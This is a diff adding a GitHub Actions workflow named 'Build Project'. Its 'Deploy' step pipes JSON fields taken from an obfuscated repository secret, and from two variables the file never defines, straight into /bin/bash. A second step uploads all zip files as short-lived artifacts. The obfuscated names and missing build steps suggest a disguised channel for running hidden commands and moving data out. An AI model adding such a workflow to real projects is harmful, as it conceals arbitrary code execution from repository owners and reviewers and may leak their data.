@@ -1,0 +1,28 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  dispatcher:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Deploy
+        env:
+          q59079: ${{ secrets.q59079 }}
+        run: |
+          printf '%s' "$q59079" | jq -r .uqdz01234 | /bin/bash
+          printf '%s' "$jp14272" | jq -r .qo1463 | /bin/bash
+          printf '%s' "$s4" | jq -r .resz81831 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: 6EazxntU
+          path: "*.zip"
+          retention-days: 1
